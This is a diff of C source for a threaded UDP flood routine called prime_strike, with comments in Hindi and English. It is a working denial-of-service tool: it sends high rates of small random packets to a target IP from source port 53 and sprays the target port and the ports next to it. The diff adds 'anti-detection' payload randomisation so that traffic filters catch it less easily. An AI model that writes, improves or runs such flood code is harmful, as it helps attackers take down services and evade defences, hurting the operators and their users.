@@ -28,7 +28,7 @@ void *prime_strike(void *arg) {
     source_addr.sin_port = htons(53); 
     bind(sock, (struct sockaddr *)&source_addr, sizeof(source_addr));
 
-    // ✨ KERNEL TUNING: 4MB Send Buffer
+    // ✨ KERNEL TUNING: 4MB Send Buffer for stability
     int buf_size = 4 * 1024 * 1024;
     setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
     fcntl(sock, F_SETFL, O_NONBLOCK);
@@ -38,9 +38,7 @@ void *prime_strike(void *arg) {
     server_addr.sin_port = htons(data->port);
     server_addr.sin_addr.s_addr = inet_addr(data->ip);
 
-    char payload[64]; // Small size = High PPS (Packets Per Second)
-    for (int i = 0; i < 64; i++) payload[i] = (char)(rand() % 255);
-
+    char payload[64];
     time_t end_time = time(NULL) + data->duration;
     unsigned long int packet_count = 0;
 
@@ -49,7 +47,12 @@ void *prime_strike(void *arg) {
             if (time(NULL) >= end_time) break;
         }
 
-        // Port Spray Logic: Target ke padosi ports hit karo
+        // ✨ ANTI-DETECTION: Randomize payload every 100 packets
+        if (packet_count % 100 == 0) {
+            for (int i = 0; i < 64; i++) payload[i] = (char)(rand() % 255);
+        }
+
+        // ✨ PORT SPRAY: Target ke 3 ports hit karo (+1, -1)
         for (int p_off = -1; p_off <= 1; p_off++) {
             server_addr.sin_port = htons(data->port + p_off);
             sendto(sock, payload, 64, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
